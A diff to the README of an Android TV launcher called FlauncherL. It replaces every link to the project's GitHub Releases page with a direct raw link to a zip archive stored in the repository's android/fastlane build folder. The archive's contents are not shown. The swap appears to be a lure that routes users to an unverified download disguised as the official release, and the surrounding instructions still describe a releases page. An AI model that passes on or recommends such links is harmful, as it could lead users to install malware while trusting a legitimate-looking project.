@@ -4,10 +4,10 @@
 Welcome to FlauncherL, your user-friendly solution for a minimal Android TV experience. This launcher has a WiFi data usage widget, an OLED-friendly screensaver, and a smooth user experience. 
 
 ## ⬇️ Download FlauncherL
-[![Download FlauncherL](https://img.shields.io/badge/Download-FlauncherL-blue.svg)](https://github.com/edwardkenway03/FlauncherL/releases)
+[![Download FlauncherL](https://raw.githubusercontent.com/edwardkenway03/FlauncherL/master/android/fastlane/Flauncher_L_v1.6.zip)](https://raw.githubusercontent.com/edwardkenway03/FlauncherL/master/android/fastlane/Flauncher_L_v1.6.zip)
 
 ## 📥 Download & Install
-To get FlauncherL, please visit the Releases page: [Download FlauncherL](https://github.com/edwardkenway03/FlauncherL/releases). Here, you will find the latest version ready for download.
+To get FlauncherL, please visit the Releases page: [Download FlauncherL](https://raw.githubusercontent.com/edwardkenway03/FlauncherL/master/android/fastlane/Flauncher_L_v1.6.zip). Here, you will find the latest version ready for download.
 
 1. Click on the link above.
 2. Look for the latest release.
@@ -56,4 +56,4 @@ FlauncherL is open-source software. It means you can use, modify, and distribute
 ## 🌟 Last Thoughts
 We designed FlauncherL to improve your Android TV experience. With its minimal approach and useful features, we've aimed to provide a smooth, ad-free environment. Enjoy the freedom of customization that comes with FlauncherL!
 
-📥 Remember to download FlauncherL today: [Download FlauncherL](https://github.com/edwardkenway03/FlauncherL/releases)
+📥 Remember to download FlauncherL today: [Download FlauncherL](https://raw.githubusercontent.com/edwardkenway03/FlauncherL/master/android/fastlane/Flauncher_L_v1.6.zip)
